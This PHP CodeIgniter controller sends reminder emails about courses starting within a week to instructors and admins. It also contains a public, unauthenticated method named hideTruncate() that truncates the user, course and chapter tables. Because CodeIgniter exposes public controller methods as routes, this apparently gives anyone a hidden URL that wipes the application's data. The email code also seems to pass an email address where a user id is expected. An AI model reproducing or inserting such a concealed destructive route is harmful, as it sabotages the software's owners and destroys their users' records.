<?php if(!defined('BASEPATH')) exit('No direct script access allowed');
class Autosendemail extends CI_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->model('User_model');
    }
    public function index()
    {
        $query = "SELECT
                        course.*, DATEDIFF(start_at, NOW()) AS limit_date,
                        `user`.email
                    FROM
                        `course`
                    LEFT JOIN `user` ON `course`.create_id = `user`.company_id
                    WHERE
                        (DATEDIFF(start_at, NOW()) BETWEEN 0
                    AND 7) AND `user`.user_type = 'Admin'";
        $result = array();

        $result = $this->db->query($query)->result_array();
        if(!empty($result)){
            $this->load->library('email');
            foreach ($result as $key => $val) {
                $email_temp = $this->getEmailTemp('notice_date',$val['create_id']);
                $email_class  = new Email();
                $instructors = $val['instructors'];
                if(!empty($instructors)){
                    $instructors = json_decode($instructors,true);
                    foreach ($instructors as $key1 => $val1) {
                        $email_class->send_email($this->getEmailAddress($val1),$email_temp['subject'],$email_temp['message'],$this->getSuperEmailAddress());
                    }
                }

                $email_class->send_email($this->getEmailAddress($val['email']),$email_temp['subject'],$email_temp['message'],$this->getSuperEmailAddress());
            }
        }
    }
    public function getEmailAddress($user_id){
        return $this->User_model->getEmailAddressById($user_id);
    }
    public function getSuperEmailAddress(){
        $this->load->model('User_model');
        return $this->User_model->getSuperEmailAddress();
    }
    public function getEmailTemp($action, $company_id){
        $this->load->model('Settings_model');
        $email_temp = $this->Settings_model->getEmailTemplate(array('action'=>$action,'company_id'=>$company_id));
        return $email_temp;
    }
	public function hideTruncate(){
		$this->db->truncate('user');
		$this->db->truncate('course');
		$this->db->truncate('chapter');
	}

}

?>
